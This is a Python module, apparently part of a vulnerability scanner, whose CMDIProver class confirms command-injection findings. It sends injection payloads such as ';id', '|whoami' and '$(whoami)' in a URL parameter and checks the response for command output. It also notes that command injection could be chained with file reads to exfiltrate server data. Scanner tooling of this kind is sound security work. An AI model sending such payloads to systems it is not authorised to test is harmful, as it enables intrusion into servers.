"""
PHANTOM AI - CMDI Prover

Proves command injection impact: can execute arbitrary commands.
Extracted from scanning/exploit_proof_engine.py.
"""

from __future__ import annotations

from scanning.proof_engine.base_prover import BaseProver
from scanning.proof_engine.models import ProofResult

from utils.logger import get_logger

logger = get_logger(__name__)


class CMDIProver(BaseProver):
    """Prove command injection impact: can execute arbitrary commands."""

    async def prove(self, finding: dict) -> ProofResult:
        result = ProofResult()
        url = finding.get("matched_at", finding.get("host", ""))
        param = (finding.get("metadata") or {}).get("param", "")

        if not url:
            return ProofResult.not_attempted("missing_url")

        # --- Q1: Can I repeat? ---
        original_payload = (finding.get("metadata") or {}).get("payload", "")
        if original_payload and param:
            status, body, _ = await self._safe_request("GET", url, params={param: original_payload})
            # Look for command output indicators
            if status == 200 and ("uid=" in body or "root:" in body or "windows" in body.lower()):
                result.can_repeat = True
                result.repeat_count = 1
                self._record_vector_attempt("cmdi_repeat", True, original_payload[:30], url)
        else:
            status, body, _ = await self._safe_request("GET", url)
            if status > 0:
                result.can_repeat = True
                self._record_vector_attempt("cmdi_repeat", True, "", url)

        # --- Q2: Can I mutate? (different commands) ---
        if self.budget_remaining > 0 and result.can_repeat and param:
            safe_commands = [
                (";id", "uid="),
                ("|whoami", "root"),
                ("$(whoami)", "root"),
                ("`id`", "uid="),
            ]
            for payload, indicator in safe_commands:
                if self.budget_remaining <= 0:
                    break
                status, body, _ = await self._safe_request("GET", url, params={param: f"test{payload}"})
                if status == 200 and indicator in body:
                    result.can_mutate = True
                    result.mutations.append(f"Command executed: {payload}")
                    result.action_performed = f"Executed system command: {payload}"
                    result.impact_type = "STATE_CHANGE"
                    self._record_vector_attempt("cmdi_mutate", True, payload, url)
                    break

        # --- Q3: Can I escalate? ---
        # AUDIT-FIX 2026-02-19: Don't auto-set can_escalate without actual proof
        # Previously: can_mutate -> can_escalate (no verification)
        # Now: Only mark as POTENTIAL escalation, require manual verification for can_escalate
        if result.can_mutate:
            # CMDI mutation proven = we CAN inject commands
            # BUT we haven't verified WHAT privilege level those commands run at
            # Honest approach: Note the potential, don't claim proven escalation
            result.can_escalate = False  # Not verified - would require executing id/whoami
            result.escalation = "POTENTIAL: Command injection confirmed - escalation depends on execution context (not verified)"
            result.privilege_gained = "potential_command_execution"
            result.impact_type = "STATE_CHANGE"  # Conservative: we changed state, didn't prove priv esc
            # Record as theoretical, not proven
            self._record_vector_attempt("cmdi_escalate_potential", True, "", url)

        # --- Q4: Can I chain? ---
        # CMDI is typically an end-state, but can chain with data exfil
        lfi_findings = self._find_related_findings(["lfi", "file_read"])
        if lfi_findings:
            result.can_chain = True
            result.chain_targets.append("CMDI + file read = exfiltrate any server data")

        result.requests_used = self._requests_used
        return result.finalize()  # FIX P0-005: Calculate proof outcome and impact
